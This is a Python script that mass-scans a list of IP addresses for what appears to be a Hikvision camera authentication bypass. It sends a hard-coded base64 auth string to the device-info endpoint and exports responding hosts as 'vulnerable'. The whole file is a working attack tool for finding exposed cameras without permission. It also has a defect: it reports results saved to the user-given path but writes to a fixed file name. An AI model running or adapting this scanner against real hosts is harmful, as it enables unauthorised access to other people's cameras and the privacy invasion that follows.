import requests
import argparse
from colorama import Fore, Style

# Create a Session
http = requests.Session()

def send_requests(ip_list, output_file):
    good_counter = 0
    bad_counter = 0
    good_hosts = []

    for ip in ip_list:
        url = f"http://{ip}/System/deviceInfo?auth=YWRtaW46MTEK"
        try:
            response = http.get(url, timeout=3)
            if "xmlns=\"http://www.hikvision.com/ver10/XMLSchema\"" in response.text:
                print(f'{ip}:{Fore.GREEN}Target is Vulnerable{Style.RESET_ALL}')
                good_counter += 1
                good_hosts.append(ip)
            else:
                print(f'{ip}:{Fore.RED}Target isnt Vulnerable{Style.RESET_ALL}')
                bad_counter += 1
        except requests.exceptions.RequestException as e:
            if 'timed out' in str(e):
                print(f'{ip}:{Fore.YELLOW}Target is unavailable within 3 seconds{Style.RESET_ALL}')
            elif 'too many 503 error responses' in str(e):
                print(f'{ip}:{Fore.YELLOW}Target has returned too many 503 responses{Style.RESET_ALL}')
            else:
                print(f'Request to {ip} failed. Error: {e}')
            bad_counter += 1

    print(f'{Fore.GREEN}Vulnerable targets - {good_counter}{Style.RESET_ALL}')
    print(f'{Fore.RED}Unvulnerable targets - {bad_counter}{Style.RESET_ALL}')

    # Write the good hosts to a file
    with open('output_file.txt', 'w') as f:
        for host in good_hosts:
            f.write(f'{host}\n')

    print(f'{Fore.YELLOW}{Style.BRIGHT}The Vulnerable targets have been exported to {output_file}{Style.RESET_ALL}')

# Create the parser
parser = argparse.ArgumentParser(description='Process a list of IP addresses.')

# Add the arguments
parser.add_argument('-l', '--list', metavar='list', type=str, help='the path to the IP list file')
parser.add_argument('-o', '--output', metavar='output', type=str, help='the path to the output file')
# Parse the arguments
args = parser.parse_args()

# Read the IP addresses from a file
with open(args.list, 'r') as f:
    ip_list = [line.strip() for line in f]

send_requests(ip_list, args.output)
